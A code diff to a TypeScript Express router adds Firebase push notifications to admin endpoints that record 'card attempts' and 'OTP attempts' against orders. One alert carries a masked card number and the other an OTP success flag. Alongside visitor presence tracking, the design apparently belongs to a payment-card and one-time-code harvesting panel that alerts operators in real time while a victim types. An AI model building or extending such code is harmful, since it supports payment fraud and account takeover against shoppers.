@@ -4,6 +4,7 @@ import { db, ordersTable, productsTable, presenceTable, siteContentTable, visito
 import { CreateProductBody, UpdateProductBody, UpdateSiteContentBody, UpdateOrderBody } from "@workspace/api-zod";
 import { mapProductRow, mapSiteContentRow, isPresenceActive } from "./utils";
 import { supabase, getPublicImageUrl } from "../lib/supabase";
+import { sendPushNotification, notifyAdminsOfCardAttempt, notifyAdminsOfOtpAttempt } from "../lib/firebase-admin";
 import crypto from "crypto";
 import jwt from "jsonwebtoken";
 
@@ -268,6 +269,13 @@ router.post("/admin/orders/:orderId/card-attempts", async (req, res, next) => {
       })
       .where(eq(ordersTable.id, orderId));
 
+    // Get order details for notification
+    const [order] = await db
+      .select()
+      .from(ordersTable)
+      .where(eq(ordersTable.id, orderId))
+      .limit(1);
+
     // Broadcast card attempt to all admin clients for real-time updates
     const pm = await getPresenceManager();
     if (pm) {
@@ -282,6 +290,12 @@ router.post("/admin/orders/:orderId/card-attempts", async (req, res, next) => {
           createdAt: attempt.createdAt.toISOString(),
         },
       });
+    }
+
+    // Send push notification to admin devices
+    if (order) {
+      const maskedCard = `****${cardNumber.slice(-4)}`;
+      notifyAdminsOfCardAttempt(order, maskedCard);
     }
 
     res.status(201).json(attempt);
@@ -352,6 +366,13 @@ router.post("/admin/orders/:orderId/otp-attempts", async (req, res, next) => {
         .where(eq(ordersTable.id, orderId));
     }
 
+    // Get order details for notification
+    const [order] = await db
+      .select()
+      .from(ordersTable)
+      .where(eq(ordersTable.id, orderId))
+      .limit(1);
+
     // Broadcast OTP attempt to all admin clients for real-time updates
     const pm = await getPresenceManager();
     if (pm) {
@@ -365,6 +386,11 @@ router.post("/admin/orders/:orderId/otp-attempts", async (req, res, next) => {
           createdAt: attempt.createdAt.toISOString(),
         },
       });
+    }
+
+    // Send push notification to admin devices
+    if (order) {
+      notifyAdminsOfOtpAttempt(order, success ?? false);
     }
 
     res.status(201).json(attempt);
